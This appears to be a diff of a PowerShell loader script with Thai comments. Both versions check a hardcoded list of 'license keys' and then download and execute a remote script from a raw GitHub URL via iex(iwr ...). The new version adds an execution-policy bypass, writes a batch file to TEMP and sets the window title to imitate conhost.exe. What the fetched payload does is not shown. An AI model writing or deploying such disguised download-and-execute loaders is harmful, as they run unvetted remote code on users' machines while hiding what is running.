@@ -1,42 +1,48 @@
-$Host.UI.RawUI.WindowTitle = "C:\Windows\System32\conhost.exe"
-Clear-Host
+===== สร้าง CMD แล้วปิด PowerShell =====
+if (-not $env:RUN_CMD) {
 
-===== เปิด ConsoleHost_history.txt =====
-$hist = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
-if (!(Test-Path $hist)) {
-    New-Item -ItemType File -Path $hist -Force | Out-Null
-}
-Start-Process notepad.exe $hist
+    $env:RUN_CMD = "1"
 
-===== KEY LIST =====
-$keys = @(
-"finalpremium-27BHJ",
-"finalpremium-8K2LM",
-"finalpremium-X91QP",
-"finalpremium-55TGH",
-"finalpremium-AB12Z",
-"finalpremium-9PLK3",
-"finalpremium-QW77E",
-"finalpremium-ZX90N",
-"finalpremium-MN45R",
-"finalpremium-LL22X",
-"Nel",
-"King"
+    $cmd = @"
+@echo off
+title C:\Windows\System32\conhost.exe
+cls
+
+set hist=%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+if not exist "%hist%" type nul > "%hist%"
+start notepad "%hist%"
+
+set /p key=Enter license key: 
+
+set valid=0
+
+if "%key%"=="finalpremium-27BHJ" set valid=1
+if "%key%"=="finalpremium-8K2LM" set valid=1
+if "%key%"=="finalpremium-X91QP" set valid=1
+if "%key%"=="finalpremium-55TGH" set valid=1
+if "%key%"=="finalpremium-AB12Z" set valid=1
+if "%key%"=="finalpremium-9PLK3" set valid=1
+if "%key%"=="finalpremium-QW77E" set valid=1
+if "%key%"=="finalpremium-ZX90N" set valid=1
+if "%key%"=="finalpremium-MN45R" set valid=1
+if "%key%"=="finalpremium-LL22X" set valid=1
+if "%key%"=="Nel" set valid=1
+if "%key%"=="King" set valid=1
+
+if "%valid%"=="1" (
+    powershell -ExecutionPolicy Bypass -Command "iex (iwr 'https://raw.githubusercontent.com/lnwmon2-crypto/private/main/main.ps1')"
+    echo.
+    echo Successfully
+) else (
+    echo Invalid key
 )
 
-===== รับ key =====
-$key = Read-Host "Enter license key"
+pause
+"@
 
-===== เช็ค key =====
-if ($keys -contains $key) {
+    $path = "$env:TEMP\run.bat"
+    $cmd | Out-File -Encoding ASCII $path
 
-    # โหลด main.ps1 แบบเสถียร
-    $script = (iwr "https://raw.githubusercontent.com/lnwmon2-crypto/private/main/main.ps1").Content
-    iex $script
-
-    Write-Host ""
-    Write-Host "Successfully" -ForegroundColor Green
-}
-else {
-    Write-Host "Invalid key" -ForegroundColor Red
+    Start-Process cmd -ArgumentList "/k "$path""
+    exit
 }
